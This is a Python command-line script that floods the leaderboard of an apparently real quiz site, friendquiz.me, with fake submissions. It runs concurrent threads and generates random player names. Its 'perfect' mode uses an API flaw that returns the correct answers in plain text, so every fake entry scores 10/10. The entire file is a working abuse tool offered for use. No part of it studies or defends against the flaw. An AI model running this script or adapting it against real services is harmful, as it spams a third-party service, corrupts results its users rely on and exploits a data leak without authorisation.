"""Command-line flooder for FriendQuiz leaderboards.

Submits anonymous answers to a FriendQuiz quiz in bulk, either with
random options or with the correct answers (which the quiz API returns
in plain text, so "perfect" scores are trivial to achieve).
"""

import argparse
import random
import sys
import threading
import time

import requests

API = "https://friendquiz.me"
SUBMIT_ENDPOINT = f"{API}/api/answer.php"
QUIZ_ENDPOINT = f"{API}/api/quiz.php"

ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"


def random_name():
    """Generate a plausible-looking random player name."""
    style = random.randint(0, 2)
    if style == 0:
        return "".join(random.choices(ALPHABET, k=random.randint(3, 8)))
    if style == 1:
        return (
            random.choice(ALPHABET).upper()
            + "".join(random.choices(ALPHABET, k=random.randint(3, 7)))
        )
    return str(random.randint(1000, 99999))


def load_quiz(code):
    """Fetch the quiz definition for a given code."""
    resp = requests.get(QUIZ_ENDPOINT, params={"code": code}, timeout=15)
    resp.raise_for_status()
    return resp.json()


def build_payload(code, quiz, name, mode):
    """Build the form-encoded answer payload for one submission."""
    values = quiz.get("values") or []
    questions = quiz.get("questions") or []
    data = {"code": code, "name": name}
    for i, question in enumerate(questions):
        if mode == "perfect" and i < len(values):
            # Use the known-correct answer from the API leak.
            data[f"q{i + 1}"] = values[i]
        else:
            data[f"q{i + 1}"] = random.choice(question["options"])["option_id"]
    return data


def submit(session, quiz, code, name, mode, stats):
    """Send a single submission and record the outcome."""
    try:
        payload = build_payload(code, quiz, name, mode)
        resp = session.post(SUBMIT_ENDPOINT, data=payload, timeout=20)
        resp.raise_for_status()
        body = resp.json()
        with stats["lock"]:
            stats["ok"] += 1
            stats["score"] += body.get("score", 0)
            stats["last"] = (name, body.get("score"), resp.status_code)
    except Exception as exc:  # noqa: BLE001
        with stats["lock"]:
            stats["fail"] += 1
            stats["last_err"] = f"{name}: {exc!r}"


def worker(quiz, code, mode, count, stats, delay, stop):
    """Run submissions in a loop until the worker's share is done."""
    session = requests.Session()
    for _ in range(count):
        if stop.is_set():
            break
        submit(session, quiz, code, random_name(), mode, stats)
        if delay > 0:
            time.sleep(delay)


def main():
    # The Windows console defaults to cp1252, which chokes on emoji titles.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass

    parser = argparse.ArgumentParser(
        description="Flood a FriendQuiz leaderboard with fake answers."
    )
    parser.add_argument("code", help="quiz code, e.g. U4aV9HED")
    parser.add_argument("-n", "--count", type=int, default=100, help="total submissions (default 100)")
    parser.add_argument("-t", "--threads", type=int, default=8, help="concurrent workers (default 8)")
    parser.add_argument("-d", "--delay", type=float, default=0.0, help="seconds between requests per worker")
    parser.add_argument(
        "-m",
        "--mode",
        choices=["random", "perfect"],
        default="random",
        help="'random' picks random options, 'perfect' always gets 10/10",
    )
    parser.add_argument("--quiet", action="store_true", help="only print the final summary")
    args = parser.parse_args()

    print(f"[*] Loading quiz {args.code} ...")
    quiz = load_quiz(args.code)
    print(f"[*] Quiz: {quiz.get('title')} — {len(quiz.get('questions') or [])} questions")

    stats = {"ok": 0, "fail": 0, "score": 0, "lock": threading.Lock(), "last": None, "last_err": None}
    stop = threading.Event()
    per_worker = -(-args.count // args.threads)
    threads = [
        threading.Thread(
            target=worker,
            args=(quiz, args.code, args.mode, per_worker, stats, args.delay, stop),
            daemon=True,
        )
        for _ in range(args.threads)
    ]

    print(f"[*] Firing {args.count} submissions across {args.threads} workers (mode={args.mode}) ...")
    started = time.time()
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    elapsed = time.time() - started
    print(f"[+] done: {stats['ok']} ok / {stats['fail']} failed in {elapsed:.1f}s")
    if stats["ok"]:
        print(f"[+] avg score: {stats['score'] / stats['ok']:.1f}  |  last entry: {stats['last']}")
    if stats["fail"]:
        print(f"[!] sample error: {stats['last_err']}")


if __name__ == "__main__":
    main()
